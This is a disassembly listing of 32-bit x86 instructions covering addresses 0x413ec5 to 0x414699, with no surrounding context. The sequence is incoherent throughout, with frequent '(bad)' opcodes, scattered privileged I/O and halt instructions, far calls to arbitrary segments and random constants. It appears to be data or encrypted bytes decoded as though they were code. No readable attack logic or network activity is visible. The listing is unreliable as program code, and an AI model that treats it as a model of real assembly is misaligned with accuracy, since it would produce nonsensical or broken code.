  413ec5:	add    eax,0x8036313e
  413eca:	ret    
  413ecb:	or     ah,dh
  413ecd:	addr16 cld 
  413ecf:	xchg   ebx,eax
  413ed0:	sub    DWORD PTR [ebp-0x65],0x49
  413ed4:	ins    DWORD PTR es:[edi],dx
  413ed5:	or     eax,0xd59a48fb
  413eda:	jbe    0x413e85
  413edc:	push   cs
  413edd:	cmp    BYTE PTR [esi],0xca
  413ee0:	mov    WORD PTR [eax-0x36],fs
  413ee3:	mov    ds:0xe4a48550,al
  413ee8:	cmp    BYTE PTR [ebx+0x3a],cl
  413eeb:	test   al,0x1b
  413eed:	test   BYTE PTR [ebp-0x63692b4f],bl
  413ef3:	repnz loop 0x413ea9
  413ef6:	std    
  413ef7:	lods   al,BYTE PTR ds:[esi]
  413ef8:	jo     0x413e96
  413efa:	mov    ch,0x93
  413efc:	loop   0x413ed0
  413efe:	xchg   ebp,eax
  413eff:	inc    ebp
  413f00:	cmp    BYTE PTR [edi+eax*8],0xed
  413f04:	sti    
  413f05:	mov    dl,0x34
  413f07:	popf   
  413f08:	xchg   edi,eax
  413f09:	or     al,0xdd
  413f0b:	inc    ecx
  413f0c:	and    DWORD PTR [edi],ebp
  413f0e:	pop    ds
  413f0f:	jp     0x413f79
  413f11:	(bad)  
  413f12:	dec    ebx
  413f13:	out    0xec,eax
  413f15:	cmp    dl,dl
  413f17:	inc    esp
  413f18:	fsubr  DWORD PTR [ebx+0x6e5b76c6]
  413f1e:	add    dh,bl
  413f20:	jnp    0x413f11
  413f22:	sub    cl,BYTE PTR ds:0xa066b883
  413f28:	push   0xffffff9b
  413f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f2b:	mov    esi,0xb76f0887
  413f30:	cmp    dl,BYTE PTR [esi-0x63]
  413f33:	out    0xda,al
  413f35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f36:	lds    esp,FWORD PTR [esi-0x2393d25b]
  413f3c:	in     al,dx
  413f3d:	push   ebx
  413f3e:	or     eax,0xaf29f7b1
  413f43:	loopne 0x413f27
  413f45:	cmp    ecx,ebp
  413f47:	(bad)
  413f4b:	mov    al,0x80
  413f4d:	cmp    BYTE PTR [eax+0x4e256bfd],dl
  413f53:	add    esi,DWORD PTR [eax-0x65]
  413f56:	inc    edi
  413f57:	cdq    
  413f58:	add    BYTE PTR [ecx],0x8b
  413f5b:	add    DWORD PTR [eax],0xffffffdb
  413f5e:	mov    ds:0x5e307691,al
  413f63:	mov    cl,BYTE PTR [esi+eax*8+0x35e26e50]
  413f6a:	push   esi
  413f6b:	dec    esp
  413f6c:	adc    esp,DWORD PTR [ebx-0x23409132]
  413f72:	imul   edi,DWORD PTR [ebx+edi*2],0xd5a71076
  413f79:	loope  0x413fbe
  413f7b:	(bad)  
  413f7c:	out    dx,eax
  413f7d:	cmc    
  413f7e:	mov    ah,0x34
  413f80:	cmp    DWORD PTR [ecx+0x7d],ecx
  413f83:	push   ss
  413f84:	sahf   
  413f85:	inc    ebx
  413f86:	and    edx,DWORD PTR [ecx+0x25e968f9]
  413f8c:	and    ecx,eax
  413f8e:	repz pop ecx
  413f90:	push   esp
  413f91:	push   cs
  413f92:	ins    BYTE PTR es:[edi],dx
  413f93:	jne    0x413f21
  413f95:	or     dl,BYTE PTR [esi]
  413f97:	add    bl,BYTE PTR [eax-0x31]
  413f9a:	xor    eax,0x6849feee
  413f9f:	outs   dx,BYTE PTR ds:[esi]
  413fa0:	sbb    edi,DWORD PTR [esi+0xa]
  413fa3:	out    0x59,eax
  413fa5:	push   es
  413fa6:	xchg   ecx,eax
  413fa7:	sbb    BYTE PTR [esi-0x7],bh
  413faa:	clc    
  413fab:	mov    ds:0x69aea884,eax
  413fb0:	mov    eax,ds:0x6a668ac
  413fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fb6:	mov    al,0xdb
  413fb8:	pushf  
  413fb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fba:	repz push 0xdb360f6a
  413fc0:	inc    esp
  413fc1:	mov    WORD PTR [ebx-0x25eb1d53],gs
  413fc7:	stos   BYTE PTR es:[edi],al
  413fc8:	jl     0x41402e
  413fca:	shl    BYTE PTR [eax+0x6b],0x3e
  413fce:	adc    eax,0xbc22bf31
  413fd3:	pop    esp
  413fd4:	xlat   BYTE PTR ds:[bx]
  413fd6:	repnz lahf 
  413fd8:	inc    eax
  413fd9:	rol    esi,cl
  413fdb:	fst    st(7)
  413fdd:	jb     0x41404a
  413fdf:	pop    ebx
  413fe0:	stos   DWORD PTR es:[edi],eax
  413fe1:	push   ebp
  413fe2:	mov    cl,0x24
  413fe4:	sbb    DWORD PTR [edx],esi
  413fe6:	pushf  
  413fe7:	ror    BYTE PTR [edi],cl
  413fe9:	xchg   ebp,eax
  413fea:	stos   DWORD PTR es:[edi],eax
  413feb:	jo     0x414016
  413fed:	fldcw  WORD PTR [edi]
  413fef:	call   0xab386b2f
  413ff4:	and    ebx,edx
  413ff6:	adc    al,0xb5
  413ff8:	lea    edi,[ebx]
  413ffa:	cwde   
  413ffb:	mov    dh,BYTE PTR [esi-0x39]
  413ffe:	sub    DWORD PTR [ebx-0x6e],ebp
  414001:	mov    ah,BYTE PTR [esi]
  414003:	mov    ebp,0x2557cba3
  414008:	add    eax,0xa3995b38
  41400d:	dec    esp
  41400e:	ret    
  41400f:	xor    DWORD PTR [esi],ebx
  414011:	cmp    eax,0x50d55dc6
  414016:	push   cs
  414017:	ret    0xabb0
  41401a:	hlt    
  41401b:	arpl   di,bx
  41401d:	(bad)  
  41401e:	xor    BYTE PTR [edx],bh
  414020:	xchg   ebp,esi
  414022:	xor    edi,ebp
  414024:	fmul   st(2),st
  414026:	add    al,0x4d
  414028:	cmc    
  414029:	mov    BYTE PTR [esi],0xa1
  41402c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41402d:	enter  0x7073,0xe2
  414031:	dec    ebx
  414032:	xlat   BYTE PTR ds:[ebx]
  414033:	int3   
  414034:	sub    DWORD PTR ds:0x4b028c9c,ecx
  41403a:	pop    esp
  41403b:	mov    ecx,0x33aee5f3
  414040:	push   edi
  414041:	js     0x413fd7
  414043:	das    
  414044:	cmp    DWORD PTR [ebx],ebx
  414046:	add    ebp,DWORD PTR [esi+0xb]
  414049:	rcr    DWORD PTR [eax],1
  41404b:	imul   al
  41404d:	push   esi
  41404e:	adc    eax,0xa0949f6c
  414053:	test   al,0x3d
  414055:	loop   0x414065
  414057:	rcr    BYTE PTR [ebx+0x2ea06c02],cl
  41405d:	jmp    0x4140d1
  41405f:	test   DWORD PTR [edx+0x3c4c2633],ebx
  414065:	or     DWORD PTR ds:[edi-0x194f8099],ebx
  41406c:	push   eax
  41406d:	push   0x16
  41406f:	out    dx,al
  414070:	xchg   esi,eax
  414071:	enter  0x30e6,0xa3
  414075:	mov    al,0xfc
  414077:	mov    DWORD PTR [edi],esp
  414079:	shr    DWORD PTR [eax-0x1f],1
  41407c:	sbb    eax,0x80affe6c
  414081:	daa    
  414082:	mov    ah,0x3c
  414084:	pusha  
  414085:	in     eax,0xca
  414087:	inc    esi
  414088:	or     ch,0x57
  41408b:	ins    BYTE PTR es:[edi],dx
  41408c:	int    0x5d
  41408e:	adc    BYTE PTR [ecx],cl
  414090:	stos   DWORD PTR es:[edi],eax
  414091:	imul   ebx,edi,0x70
  414094:	jp     0x4140b7
  414096:	sub    DWORD PTR [ebp-0x1b3a1b2],0x88c4f2d2
  4140a0:	push   edx
  4140a1:	xor    al,0xb7
  4140a3:	stos   BYTE PTR es:[edi],al
  4140a4:	cmc    
  4140a5:	setbe  cl
  4140a8:	pop    ds
  4140a9:	push   0x14efdaae
  4140ae:	adc    BYTE PTR [edx+0x76],0xc4
  4140b2:	pop    edx
  4140b3:	stc    
  4140b4:	mov    bh,0x9f
  4140b6:	int    0x7e
  4140b8:	adc    eax,0xcd2539d
  4140bd:	inc    esi
  4140be:	stc    
  4140bf:	mov    ds:0x3460b85e,eax
  4140c4:	pop    ss
  4140c5:	xchg   edi,eax
  4140c6:	pushf  
  4140c7:	inc    eax
  4140c8:	jmp    0x4140c5
  4140ca:	sbb    dh,BYTE PTR [edi]
  4140cc:	inc    esi
  4140cd:	test   BYTE PTR [ecx],cl
  4140cf:	loopne 0x41413d
  4140d1:	pop    edi
  4140d2:	push   ss
  4140d3:	jl     0x414139
  4140d5:	add    ecx,DWORD PTR [eax-0x5c632d18]
  4140db:	sbb    DWORD PTR [ecx+0x2],esi
  4140de:	shr    BYTE PTR ds:0xe13a5bc7,cl
  4140e4:	hlt    
  4140e5:	fwait
  4140e6:	daa    
  4140e7:	cmp    edi,DWORD PTR [edx+0x3d74c84f]
  4140ed:	sbb    DWORD PTR [edi+0x68],eax
  4140f0:	call   0x24de:0x96228955
  4140f7:	inc    ecx
  4140f8:	(bad)  
  4140fa:	imul   edx,DWORD PTR [ebp-0x88254d6],0xda3d31b9
  414104:	sbb    DWORD PTR ds:0xfb349bc6,ecx
  41410a:	jle    0x4140c4
  41410c:	(bad)  [edx]
  41410e:	xchg   edi,eax
  41410f:	aaa    
  414110:	mov    esi,0x4653b4a
  414115:	cmp    eax,DWORD PTR [esi+0x18]
  414118:	xor    eax,DWORD PTR [esi+0x4a]
  41411b:	ss (bad) 
  41411d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41411e:	inc    esp
  41411f:	rol    esi,cl
  414121:	xchg   esi,eax
  414122:	push   DWORD PTR ds:0x71ffd1f3
  414128:	cmp    eax,DWORD PTR [esi]
  41412a:	inc    esi
  41412b:	inc    esi
  41412c:	push   ds
  41412d:	lock xlat BYTE PTR ds:[ebx]
  41412f:	xor    BYTE PTR [edx-0x38],ah
  414132:	enter  0xe267,0xbb
  414136:	push   edx
  414137:	sbb    al,0x42
  414139:	js     0x41412a
  41413b:	cmp    BYTE PTR [ecx-0x3e],bl
  41413e:	(bad)  
  41413f:	aad    0x7b
  414141:	pop    ds
  414142:	nop
  414143:	call   0x5b6a:0x659e4ed3
  41414a:	es lock fcmovnb st,st(7)
  41414e:	in     eax,0x29
  414150:	lods   al,BYTE PTR ds:[esi]
  414151:	hlt    
  414152:	fcomp  DWORD PTR [eax-0x63]
  414155:	xchg   ecx,eax
  414156:	out    0xbb,eax
  414158:	shr    bl,1
  41415a:	push   ebp
  41415b:	jmp    0x90f1:0xff4c0a64
  414162:	adc    al,0x2b
  414164:	mov    dl,0x57
  414166:	add    ah,bl
  414168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41416a:	and    al,BYTE PTR ds:0xccbf1865
  414170:	xchg   edx,eax
  414171:	jg     0x414171
  414173:	rcr    ecx,1
  414175:	mov    BYTE PTR [esi-0x8],ah
  414178:	push   edx
  414179:	in     eax,dx
  41417a:	js     0x41415b
  41417c:	dec    esi
  41417d:	sub    DWORD PTR [eax-0xc926606],ebx
  414183:	mov    eax,0xc74e3e1
  414188:	push   edx
  414189:	push   ebx
  41418a:	shl    BYTE PTR [ebx-0x7f],cl
  41418d:	cmp    al,0xe3
  41418f:	mov    esi,0xf3fe449b
  414194:	jae    0x4141c7
  414196:	jmp    0x7b1006df
  41419b:	(bad)  
  41419c:	dec    eax
  41419d:	sar    esi,0x8a
  4141a0:	xor    DWORD PTR [edi+ebx*2],edx
  4141a3:	xchg   ebp,eax
  4141a4:	add    BYTE PTR [eax+0x2113957d],al
  4141aa:	imul   eax,DWORD PTR [esi],0x6c
  4141ad:	dec    edx
  4141ae:	mov    dl,0xc1
  4141b0:	ret    
  4141b1:	mov    ch,0xbb
  4141b3:	sub    eax,0x247030be
  4141b8:	cdq    
  4141b9:	aam    0xd9
  4141bb:	(bad)  
  4141bc:	pop    ebp
  4141bd:	and    eax,0x885528d
  4141c2:	vsubsd xmm5,xmm6,xmm1
  4141c6:	sub    BYTE PTR [ecx],ah
  4141c8:	push   cs
  4141c9:	inc    esp
  4141ca:	push   ds
  4141cb:	push   esi
  4141cc:	ins    BYTE PTR es:[edi],dx
  4141cd:	push   eax
  4141ce:	jl     0x414214
  4141d0:	mov    dl,0xde
  4141d2:	adc    ebx,DWORD PTR [eax]
  4141d4:	ficomp DWORD PTR [esi+0x719acc05]
  4141da:	adc    eax,0x56ca7fbd
  4141df:	ds jo  0x4141f2
  4141e2:	icebp  
  4141e3:	inc    edx
  4141e4:	lahf   
  4141e5:	cmp    esp,edi
  4141e7:	sub    esi,DWORD PTR [esp+ecx*4+0x44776421]
  4141ee:	jmp    0x7cdea811
  4141f3:	aaa    
  4141f4:	ins    BYTE PTR es:[edi],dx
  4141f5:	jne    0x41421c
  4141f7:	popa   
  4141f8:	push   cs
  4141f9:	fisub  DWORD PTR [ecx]
  4141fb:	(bad)  ds:0x4b71c269
  414201:	mov    ds:0x6485c06,eax
  414206:	iret   
  414207:	add    DWORD PTR [ebp+0x3baa3fb1],esi
  41420d:	adc    eax,0x8b63ea13
  414212:	mov    bh,0x87
  414214:	mov    cl,0x5f
  414216:	dec    edi
  414217:	ss iret 
  414219:	add    DWORD PTR [eax+0x27],ebx
  41421c:	test   DWORD PTR [edi],esp
  41421e:	push   esi
  41421f:	dec    edx
  414220:	stos   DWORD PTR es:[edi],eax
  414221:	jp     0x41421d
  414223:	push   0x42
  414225:	xchg   BYTE PTR [edx+0x52],bh
  414228:	push   ds
  414229:	shl    BYTE PTR [ebx-0x5b],1
  41422c:	pop    ss
  41422d:	and    edi,DWORD PTR [ebx-0x38085a9]
  414233:	(bad)
  414236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414237:	mov    ds:0x641a4a3d,eax
  41423c:	sbb    al,0x94
  41423e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  414240:	hlt    
  414241:	mov    dl,0x60
  414243:	lods   eax,DWORD PTR ds:[esi]
  414244:	mov    DWORD PTR [ebx-0x4b47bf61],ebp
  41424a:	imul   edx,DWORD PTR [eax-0x273a5a24],0x7
  414251:	cmp    edx,DWORD PTR [edi+0x28e42ee1]
  414257:	je     0x414215
  414259:	sbb    eax,0xfa27f017
  41425e:	and    DWORD PTR [esp+ebx*1],edx
  414261:	ds std 
  414263:	dec    ebx
  414264:	js     0x41427a
  414266:	and    ebp,DWORD PTR [edx]
  414268:	mov    eax,ds:0xc545d315
  41426d:	iret   
  41426e:	test   edi,ecx
  414270:	add    BYTE PTR [edx+0x7358ef8b],bl
  414276:	sub    dl,BYTE PTR [eax+eiz*8]
  414279:	test   DWORD PTR [eax-0x4d],0xd842b0df
  414280:	daa    
  414281:	jns    0x4142ad
  414283:	inc    ebp
  414284:	push   es
  414285:	ror    DWORD PTR [edi-0x74f11082],1
  41428b:	push   ebp
  41428c:	mov    ch,0x6e
  41428e:	mov    esi,fs
  414290:	jmp    0xaba3af3f
  414295:	sbb    BYTE PTR [eax],dh
  414297:	cwde   
  414298:	cmp    eax,0x40782746
  41429d:	mov    ecx,0x5a0ba8aa
  4142a2:	mov    cl,0x8f
  4142a4:	inc    ebp
  4142a5:	sub    al,bl
  4142a7:	ja     0x41431e
  4142a9:	test   al,0xea
  4142ab:	(bad)  
  4142ac:	nop    ebp
  4142af:	add    bl,BYTE PTR [edi+eiz*1+0x72a747b5]
  4142b6:	mov    ebp,DWORD PTR [ecx-0x7d82c546]
  4142bc:	sub    al,0x30
  4142be:	repz sub DWORD PTR [esi+0x31],eax
  4142c2:	adc    edx,ecx
  4142c4:	inc    ebp
  4142c5:	mov    dh,0x16
  4142c7:	push   ebx
  4142c8:	inc    ecx
  4142c9:	add    eax,0x21cb1309
  4142ce:	scas   al,BYTE PTR es:[edi]
  4142cf:	scas   al,BYTE PTR es:[edi]
  4142d0:	and    ecx,DWORD PTR [esi]
  4142d2:	inc    edx
  4142d3:	xor    al,0xcd
  4142d5:	or     ebx,ebx
  4142d7:	inc    eax
  4142d8:	sahf   
  4142d9:	repz pop ebx
  4142db:	adc    eax,0x2fce2e45
  4142e0:	in     eax,dx
  4142e1:	pop    eax
  4142e2:	or     bl,0xd9
  4142e5:	in     al,0xeb
  4142e7:	and    BYTE PTR [edi],0xd
  4142ea:	retf   
  4142eb:	rdmsr  
  4142ed:	push   ecx
  4142ee:	icebp  
  4142ef:	push   ss
  4142f0:	mov    edi,0xea7b8182
  4142f5:	xchg   BYTE PTR [eax+esi*2],bh
  4142f8:	lahf   
  4142f9:	push   ebx
  4142fa:	mov    DWORD PTR [esi],0x12879357
  414300:	inc    eax
  414301:	test   al,0x23
  414303:	mov    ebp,0x2147b636
  414308:	push   0xffffffab
  41430a:	mov    dh,0x40
  41430c:	add    al,0x12
  41430e:	stos   DWORD PTR es:[edi],eax
  41430f:	jne    0x414342
  414311:	mov    bh,0xf3
  414313:	mov    ecx,0x82daf3d6
  414318:	out    dx,al
  414319:	ret    
  41431a:	push   cs
  41431b:	stos   BYTE PTR es:[edi],al
  41431c:	retf   0xc27a
  41431f:	jge    0x41438d
  414321:	jb     0x414321
  414323:	jne    0x41437d
  414325:	daa    
  414326:	cmc    
  414327:	jle    0x4142c2
  414329:	in     eax,0x3
  41432b:	std    
  41432c:	push   eax
  41432d:	imul   ebx,ebp,0xffffffae
  414330:	daa    
  414331:	hlt    
  414332:	add    BYTE PTR [ecx+0x26],cl
  414335:	sbb    esi,DWORD PTR es:[ebx]
  414338:	into   
  414339:	enter  0xb810,0x8e
  41433d:	cwde   
  41433e:	jnp    0x4142e3
  414340:	pop    ecx
  414341:	pop    esp
  414342:	mov    ebp,0x8ea70211
  414347:	push   0xb6d092df
  41434c:	out    0x14,eax
  41434e:	mov    ch,0xfc
  414350:	cmp    dl,dh
  414352:	in     eax,0x24
  414354:	mov    bl,al
  414356:	ret    0x5f4c
  414359:	pushf  
  41435a:	jmp    0x414359
  41435c:	dec    ebp
  41435d:	inc    esi
  41435e:	mov    cl,0x8f
  414360:	mov    al,ds:0x851dbcc4
  414365:	or     dl,dl
  414367:	test   al,0xb1
  414369:	adc    al,BYTE PTR [edx-0x75c064c0]
  41436f:	iret   
  414370:	xchg   ebx,eax
  414371:	pop    edx
  414372:	push   es
  414373:	adc    eax,0x188f03e
  414378:	xchg   edi,eax
  414379:	xor    esi,esp
  41437b:	pop    es
  41437c:	adc    dh,BYTE PTR [eax+0x4b406052]
  414382:	or     al,0x60
  414384:	mov    BYTE PTR [esi+0x6d0db76b],ah
  41438a:	push   esp
  41438b:	clc    
  41438c:	mov    esp,0xe5ca7ee8
  414391:	lods   al,BYTE PTR ds:[esi]
  414392:	test   al,0xb7
  414394:	add    DWORD PTR [edx],0xfffffffd
  414397:	aas    
  414398:	rcl    BYTE PTR [edx],cl
  41439a:	out    0x50,al
  41439c:	jo     0x41435d
  41439e:	ret    0xd6d1
  4143a1:	mov    DWORD PTR [edi+ebp*4-0x75],ebp
  4143a5:	mov    ebx,0x26482a49
  4143aa:	mov    esp,0xb2f28973
  4143af:	push   0xca9ac25f
  4143b4:	in     al,dx
  4143b5:	jp     0x41442c
  4143b7:	adc    edi,DWORD PTR [eax+0x71]
  4143ba:	enter  0x3d0f,0x40
  4143be:	cmp    edi,edi
  4143c0:	test   BYTE PTR [ecx],dh
  4143c2:	push   ebp
  4143c3:	mov    ch,0xda
  4143c5:	aam    0x26
  4143c7:	push   ebx
  4143c8:	or     DWORD PTR [ebx],eax
  4143ca:	and    DWORD PTR [esi],edi
  4143cc:	mov    BYTE PTR [ebx-0x51],ch
  4143cf:	and    dh,BYTE PTR [esp+edi*8-0x66]
  4143d3:	mov    esi,0x52364534
  4143d8:	push   eax
  4143d9:	jo     0x414369
  4143db:	das    
  4143dc:	retf   
  4143dd:	int3   
  4143de:	dec    ebx
  4143df:	cmp    al,0x26
  4143e1:	jmp    0x4143dd
  4143e3:	push   cs
  4143e4:	cmp    DWORD PTR gs:[edi],edx
  4143e7:	int3   
  4143e8:	outs   dx,BYTE PTR ds:[esi]
  4143e9:	xchg   edi,eax
  4143ea:	int3   
  4143eb:	and    dh,ch
  4143ed:	jae    0x414433
  4143ef:	fld    TBYTE PTR [ecx+eiz*1+0x226515f2]
  4143f6:	inc    ebp
  4143f7:	outs   dx,BYTE PTR ds:[esi]
  4143f8:	jmp    0x4143a3
  4143fa:	add    eax,0x1a3f756f
  4143ff:	dec    ebx
  414400:	jno    0x41440d
  414402:	jecxz  0x414473
  414404:	mov    bl,0x80
  414406:	cwde   
  414407:	aaa    
  414408:	scas   eax,DWORD PTR es:[edi]
  414409:	cdq    
  41440a:	dec    esi
  41440b:	or     DWORD PTR [ebp-0xbfecc6b],ecx
  414411:	jmp    0xe099d9f2
  414416:	in     eax,0xfe
  414418:	or     al,0xf0
  41441a:	xor    ebx,esp
  41441c:	and    ebx,ebx
  41441e:	dec    eax
  41441f:	pushf  
  414420:	repnz xchg ebp,eax
  414422:	stc    
  414423:	stc    
  414424:	ficomp DWORD PTR [ebx+esi*4+0x300abd34]
  41442b:	(bad)  
  41442c:	or     al,0xee
  41442e:	test   DWORD PTR [edx+eiz*8-0x117319ef],ebp
  414435:	bound  ebp,QWORD PTR [esi-0x7fae6e23]
  41443b:	aaa    
  41443c:	xchg   ecx,eax
  41443d:	fiadd  DWORD PTR [edx+0x51]
  414440:	pop    ebx
  414441:	setl   BYTE PTR [edi+ebx*2-0x652b4024]
  414449:	call   0xe381:0x32f6e932
  414450:	dec    edx
  414451:	xchg   ecx,eax
  414452:	mov    cl,0xde
  414454:	inc    ebp
  414455:	mov    ds:0x4de12262,al
  41445a:	dec    edi
  41445b:	sti    
  41445c:	or     DWORD PTR [edi],0xffffffd1
  41445f:	jnp    0x414412
  414461:	call   FWORD PTR [edx]
  414463:	or     bh,BYTE PTR [ebx+0x5898fd0c]
  414469:	jg     0x414432
  41446b:	cld    
  41446c:	mov    ds:0x4445dc0c,al
  414471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414472:	sub    ch,ch
  414474:	or     dl,BYTE PTR [esi+0x55]
  414477:	push   cs
  414478:	or     esi,esi
  41447a:	push   ebp
  41447b:	inc    esp
  41447c:	or     DWORD PTR [ebx],ebx
  41447e:	and    cl,BYTE PTR [ebx-0x52]
  414481:	dec    BYTE PTR [ebx-0x7f0c5eeb]
  414487:	jmp    0x4144a4
  414489:	es xchg esi,eax
  41448b:	dec    ebp
  41448c:	mov    ebp,DWORD PTR [ebp-0x2affd46]
  414492:	mov    eax,ds:0xf215746f
  414497:	add    esp,DWORD PTR [edx-0x5c]
  41449a:	bound  esp,QWORD PTR [ecx+0x617185ce]
  4144a0:	adc    bh,BYTE PTR [ebx+0x6d27192a]
  4144a6:	jg     0x4144aa
  4144a8:	clc    
  4144a9:	lods   eax,DWORD PTR ds:[esi]
  4144aa:	es inc esi
  4144ac:	dec    esp
  4144ad:	pop    edi
  4144ae:	lea    esi,[esi]
  4144b0:	jb     0x41445b
  4144b2:	inc    ecx
  4144b3:	(bad)  
  4144b4:	xor    esp,DWORD PTR [esi]
  4144b6:	sub    al,0x46
  4144b8:	leave  
  4144b9:	outs   dx,BYTE PTR ds:[esi]
  4144ba:	rcl    eax,0x7f
  4144bd:	test   bh,dl
  4144bf:	inc    ebp
  4144c0:	hlt    
  4144c1:	fsubr  DWORD PTR [edx]
  4144c3:	xchg   ecx,eax
  4144c4:	mov    esi,0xf7ff42d5
  4144c9:	aam    0x3c
  4144cb:	ins    BYTE PTR es:[edi],dx
  4144cc:	mov    ds:0xabe287f3,eax
  4144d1:	test   al,0xca
  4144d3:	outs   dx,BYTE PTR ds:[esi]
  4144d4:	mov    dh,0xfc
  4144d6:	call   0x3bdf:0x43386f32
  4144dd:	es add eax,0x47a9a746
  4144e3:	mov    ds:0x90641ee9,eax
  4144e8:	or     BYTE PTR [eax+0xe3f62f6],al
  4144ee:	gs cld 
  4144f0:	imul   edx,DWORD PTR [edx-0x57],0x7918a129
  4144f7:	mov    eax,DWORD PTR [edi+0x1]
  4144fa:	loop   0x414556
  4144fc:	dec    esp
  4144fd:	cmp    eax,0x936eca47
  414502:	retf   0xcbc7
  414505:	push   ds
  414506:	aas    
  414507:	or     al,0x21
  414509:	push   es
  41450a:	jge    0x4144c3
  41450c:	jp     0x41449c
  41450e:	mov    BYTE PTR [ebp-0x5bb13ba5],bh
  414514:	addr16 and al,0xcf
  414517:	add    bl,ch
  414519:	inc    eax
  41451a:	inc    ecx
  41451b:	cmp    ebp,DWORD PTR [eax]
  41451d:	fcom   DWORD PTR [edx]
  41451f:	mov    edx,0x1e569e12
  414524:	xor    al,0x87
  414526:	ficom  WORD PTR [edi-0x18aa760a]
  41452c:	jp     0x4144d3
  41452e:	xor    dl,BYTE PTR [eax]
  414530:	jns    0x41456a
  414532:	inc    edx
  414533:	mov    ah,0x65
  414535:	fdiv   QWORD PTR [eax]
  414537:	or     BYTE PTR [ecx-0x63190b49],al
  41453d:	cmp    DWORD PTR [ecx+esi*4-0x7e261fc4],ebp
  414544:	fimul  WORD PTR [ecx]
  414546:	add    DWORD PTR [ebx],esp
  414548:	mov    al,ds:0x699cfd72
  41454d:	retf   0x69d1
  414550:	cmp    DWORD PTR [ebx],0xffffffe7
  414553:	in     eax,dx
  414554:	sub    al,0x5b
  414556:	mov    edx,0xeec4bdbb
  41455b:	iret   
  41455c:	call   0xc67a:0x237ae85b
  414563:	cmp    esi,DWORD PTR [ecx-0x80]
  414566:	cli    
  414567:	pop    ecx
  414568:	pop    es
  414569:	ret    0xa786
  41456c:	lods   al,BYTE PTR ds:[esi]
  41456d:	mov    eax,0x2cb30566
  414572:	loop   0x414525
  414574:	out    0x8d,al
  414576:	enter  0x61bb,0xa8
  41457a:	xchg   esp,eax
  41457b:	mov    bl,0x48
  41457d:	inc    ebp
  41457e:	jae    0x41458d
  414580:	xor    esi,DWORD PTR [eax+edi*8]
  414583:	lds    ecx,FWORD PTR [ecx]
  414585:	loope  0x41453a
  414587:	retf   0x3c5d
  41458a:	mov    edx,0x1023ee61
  41458f:	repnz inc ebp
  414591:	(bad)  
  414592:	retf   0x84b6
  414595:	sahf   
  414596:	mov    al,ds:0xaccb04aa
  41459b:	jmp    0x6fb0:0x1816a400
  4145a2:	sbb    bl,BYTE PTR [edi+0x42]
  4145a5:	xchg   edx,eax
  4145a6:	push   ss
  4145a7:	xchg   esp,eax
  4145a8:	mov    gs,WORD PTR [esp+ecx*8-0x6013282a]
  4145af:	mov    esp,0xcc96055c
  4145b4:	(bad)  [edi]
  4145b6:	xor    al,0x95
  4145b8:	add    al,0x5d
  4145ba:	adc    DWORD PTR [eax-0x761185dc],ebx
  4145c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145c1:	fadd   QWORD PTR [eax]
  4145c3:	pop    ss
  4145c4:	xlat   BYTE PTR ds:[ebx]
  4145c5:	es jmp 0x9332c6e8
  4145cb:	call   0x494f:0x55f4b2f
  4145d2:	call   0xff8d:0x7125a04c
  4145d9:	call   0x26b4:0x34ab3742
  4145e0:	fs jecxz 0x414581
  4145e3:	xchg   DWORD PTR [ebp+0x22],ebp
  4145e6:	mov    dl,0x4a
  4145e8:	sub    DWORD PTR [eax+esi*4],ecx
  4145eb:	pop    ss
  4145ec:	ja     0x414578
  4145ee:	push   ecx
  4145ef:	dec    ebx
  4145f0:	or     DWORD PTR [esi],ecx
  4145f2:	pop    edi
  4145f3:	sbb    al,al
  4145f5:	imul   esi,DWORD PTR [eax+0x196332d0],0x5e
  4145fc:	push   ecx
  4145fd:	sub    BYTE PTR [ebx+0x70f7df5e],ah
  414603:	add    al,0x94
  414605:	mov    edx,0x528054cb
  41460a:	xchg   edi,eax
  41460b:	mov    edx,0xb9e27302
  414610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414612:	and    al,0xc6
  414614:	call   0x33a8:0x9b84fb95
  41461b:	mov    ah,0xc6
  41461d:	dec    esp
  41461e:	push   cs
  41461f:	jp     0x4145ee
  414621:	sbb    BYTE PTR [eax+0x59d19a28],bl
  414627:	icebp  
  414628:	or     esi,ecx
  41462a:	jp     0x41465f
  41462c:	jne    0x4145c1
  41462e:	rcr    ah,1
  414630:	jmp    0x41463a
  414632:	pusha  
  414633:	and    DWORD PTR [eax],ebp
  414635:	xor    BYTE PTR [esi-0x4c],bl
  414638:	jle    0x41466c
  41463a:	and    dl,BYTE PTR [esi+0x45ed8268]
  414640:	retf   0x2752
  414643:	adc    bh,BYTE PTR [eax+esi*4+0x7ae9390d]
  41464a:	pop    ss
  41464b:	aaa    
  41464c:	outs   dx,BYTE PTR ds:[esi]
  41464d:	cwde   
  41464e:	cdq    
  41464f:	retf   
  414650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414651:	repz std 
  414653:	out    0xbe,al
  414655:	hlt    
  414656:	mov    ds:0x875f9db,al
  41465b:	or     eax,0xe0078a4d
  414660:	bound  edx,QWORD PTR [ecx-0x62]
  414663:	pop    esi
  414664:	cmc    
  414665:	lea    ebx,[esi]
  414667:	xor    al,0x33
  414669:	mov    dh,0x2b
  41466b:	call   0xd949ace1
  414670:	ret    0x8344
  414673:	not    DWORD PTR [ecx]
  414675:	pop    esi
  414676:	pop    ebp
  414677:	mov    ebp,0xaeab7837
  41467c:	rcl    BYTE PTR [edx+0x49cb97f2],0xf1
  414683:	push   esi
  414684:	iret   
  414685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414686:	xchg   esp,eax
  414687:	sub    edx,eax
  414689:	push   eax
  41468a:	mov    ds:0x92ed789a,al
  41468f:	inc    edi
  414690:	push   ebp
  414691:	ret    0x4bc4
  414694:	or     eax,0xa24ddfd
  414699:	push   ecx
